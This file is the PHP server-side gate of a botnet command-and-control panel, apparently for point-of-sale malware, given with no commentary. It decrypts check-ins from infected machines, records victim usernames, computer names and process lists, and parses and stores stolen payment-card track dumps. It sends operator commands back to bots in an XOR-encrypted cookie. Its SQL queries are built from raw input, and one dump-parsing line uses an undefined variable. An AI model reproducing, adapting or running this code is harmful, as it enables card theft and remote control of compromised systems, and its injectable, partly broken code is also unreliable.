<?php

function _xor($src,$key) {
for($i=0;$i<strlen($src);$i++) {
for($x=0;$x<strlen($key);$x++) {
$src{$i} = $src{$i} ^ $key{$x};
}
}
return $src;
}

function DecodeDecrypt($src,$key) {
$encodedData = str_replace(' ','+',$src);
$src = base64_decode($encodedData);
$dest = _xor($src,$key);

return $dest;
}


function GetNextDump($AllDumps) {


if(strlen($AllDumps)<15) { return NULL; }


$Dump = strstr($AllDumps,"?",true);
$Dump = $Dump . "?";

return $Dump;
}

function GetTrackType($Dump) {

$Type = NULL;
if($Dump{0}=='%') { $Type = "track1";  } else
if($Dump{0}==';') { $Type = "track2"; } else
if($Dump{0}=='+' || $Dump{0}=='!' || $Dump{0}=='#') { $Type =  "track3"; }

return $Type;
}

include ("config.php");

//////////START/////////////////////////
if(!empty($_POST["page"]) && !empty($_POST["val"])) { //we have bot connected


$encodedData = str_replace(' ','+',$_POST["val"]);
$Key = base64_decode($encodedData); //get the Key
$UID = DecodeDecrypt($_POST["page"],$Key); //get the UID

//Check if bot exist
$query = "SELECT * FROM `bots` WHERE `UID` = '$UID'"; 
$result = mysql_query($query);
$row = mysql_fetch_array($result);


if(empty($row)) { //new bot, insert
//POST variable names
//static char varUID[]           = "page=";
//static char varDumps[]         = "&ump=";
//static char varIdle[]          = "&opt=";
//static char varUsername[]      = "&unm=";
//static char varComputername[]  = "&cnm=";
//static char varProclist[]      = "&view=";
//static char varArch[]          = "&spec=";
//static char varOS[]            = "&query=";
//static char varKey[]           = "&val=";
//static char varVersion[]       = "&var=";
///////////////////////////////////////////

if(!empty($_POST["unm"])) { $Username = DecodeDecrypt($_POST["unm"],$Key); } else { $Username = ' '; }
if(!empty($_POST["cnm"])) { $Computername = DecodeDecrypt($_POST["cnm"],$Key); } else { $Computername = ' '; }
if(!empty($_POST["query"])) { $OS = DecodeDecrypt($_POST["query"],$Key); } else { $OS = ' '; }
if(!empty($_POST["spec"])) { $Arch = DecodeDecrypt($_POST["spec"],$Key); } else { $Arch = ' '; }
if(!empty($_POST["opt"])) { $Idle = DecodeDecrypt($_POST["opt"],$Key); } else { $Idle = ' '; }
if(!empty($_POST["var"])) { $Version = DecodeDecrypt($_POST["var"],$Key); } else { $Version = ' '; }
if(!empty($_POST["view"])) { $ProcList = DecodeDecrypt($_POST["view"],$Key); $ProcList = addslashes($ProcList); } else { $ProcList = ' '; }
if(empty($_POST["ip"])) { $RemoteIP = $_SERVER['REMOTE_ADDR']; } else { $RemoteIP = $_POST["ip"]; }
if(empty($_SERVER['HTTP_USER_AGENT'])) { $UserAgent = 'User-Agent: Not Captured'; } else { $UserAgent = $_SERVER['HTTP_USER_AGENT']; }
$LastVisit = time();

$query = "SELECT * FROM `commands` ORDER BY `InsertTime` DESC LIMIT 0 , 30";
$result = mysql_query($query);
$row = mysql_fetch_array($result);
$LastCommand = $row["InsertTime"];

$insert = "INSERT INTO `" . $dbname . "`.`bots` (`UID`,`Version`,`Username`,`Computername`,`RemoteIP`,`UserAgent`,`OS`,`Architecture`,`Idle Time`,`Process List`,`LastVisit`,`LastCommand`)VALUES ('$UID','$Version','$Username','$Computername','$RemoteIP','$UserAgent','$OS','$Arch','$Idle','$ProcList','$LastVisit', '$LastCommand' )"; //insert Bot
mysql_query($insert);

//Insert dumps
if(!empty($_POST["ump"])) { 
$Dumps = DecodeDecrypt($_POST["ump"],$Key);
$Dumps = addslashes($Dumps);
$insert = "INSERT INTO`" . $dbname . "`.`logs` (`UID` ,`Dumps` )VALUES ('$UID','$Dumps')";
mysql_query($insert);
}

} //REGISTERED NEW BOT 
else { //not new bot, update the dynamic fields
	
if(!empty($_POST["opt"])) { $Idle = DecodeDecrypt($_POST["opt"],$Key); } else { $Idle = ' '; }
if(!empty($_POST["view"])) { $ProcList = DecodeDecrypt($_POST["view"],$Key); $ProcList = addslashes($ProcList); } else { $ProcList = ' '; }
if(!empty($_POST["var"])) { $Version = DecodeDecrypt($_POST["var"],$Key); } else { $Version = ' '; }
if(empty($_POST["ip"])) { $RemoteIP = $_SERVER['REMOTE_ADDR']; } else { $RemoteIP = $_POST["ip"]; }
if(empty($_SERVER['HTTP_USER_AGENT'])) { $UserAgent = 'User-Agent: Not Captured'; } else { $UserAgent = $_SERVER['HTTP_USER_AGENT']; }
$LastVisit = time();

$update = "UPDATE `" . $dbname . "`.`bots` SET `Process List` = '$ProcList', `Idle Time` = '$Idle', `RemoteIP` = '$RemoteIP', `UserAgent` = '$UserAgent', `LastVisit` = '$LastVisit' WHERE `UID` = '$UID'";
mysql_query($update);

//Insert dumps
if(!empty($_POST["ump"])) { 
$Dumps = DecodeDecrypt($_POST["ump"],$Key);
$Dumps = addslashes($Dumps);


$DumpsTime = time();
$Dump = NULL;
$Bin = NULL;
$ServiceCode = NULl;
$Type = NULL;

//Skip process name
$AllDumps = NULL;
$AllDumps = strstr($Dumps,":");
if($AllDumps==NULL) { $AllDumps = $Dumps; } else { $AllDumps = substr($Start,1); }

while(($Dump = GetNextDump($AllDumps))!=NULL) { 
//echo $Dump;
$AllDumps = substr($AllDumps,strlen($Dump));
$Type = GetTrackType($Dump);
$insert = "INSERT INTO`" . $dbname . "`.`logs` (`UID` , `IP`, `Dump`,`Type`,`Bin`,`ServiceCode`,`InsertTime` )VALUES ('$UID','$RemoteIP','$Dump','$Type','$Bin','$ServiceCode','$DumpsTime')";
mysql_query($insert);

}


}

} //UPDATE DYNAMIC FIELDS

//Check if there is command to send
$cookieData = "$";

//Query bot last command time
$query = "SELECT `LastCommand` FROM `bots` WHERE `UID` LIKE '$UID'";
$row = mysql_fetch_array(mysql_query($query));
$LastCommand = $row["LastCommand"];


$query = "SELECT * FROM `commands` WHERE `UID` LIKE '$UID' AND `InsertTime` > '$LastCommand' OR `UID` LIKE \"\" AND `InsertTime` > '$LastCommand'";
//echo $query;
$result = mysql_query($query);

$LastCommand = 0;
if(!empty($result)) {
while($row = mysql_fetch_array($result)) {
$cookieData .= $row["Command"];
$cookieData .= ";";
$LastCommand = $row["InsertTime"];
}
}

$cookieData .= '#';
////////////////////////////////

//Update the bot last command
if($LastCommand!=0) {
$update = "UPDATE `" . $dbname . "`.`bots` SET `LastCommand` = '$LastCommand' WHERE `UID` = '$UID'";
mysql_query($update);
}
//////////////////////////////////////

//echo $cookieData;
//Display the command
$cookieData = base64_encode(_xor($cookieData, $Key));
setcookie('response',$cookieData);

//////////////////////////

} //THERE IS BOT CONNECTED

?>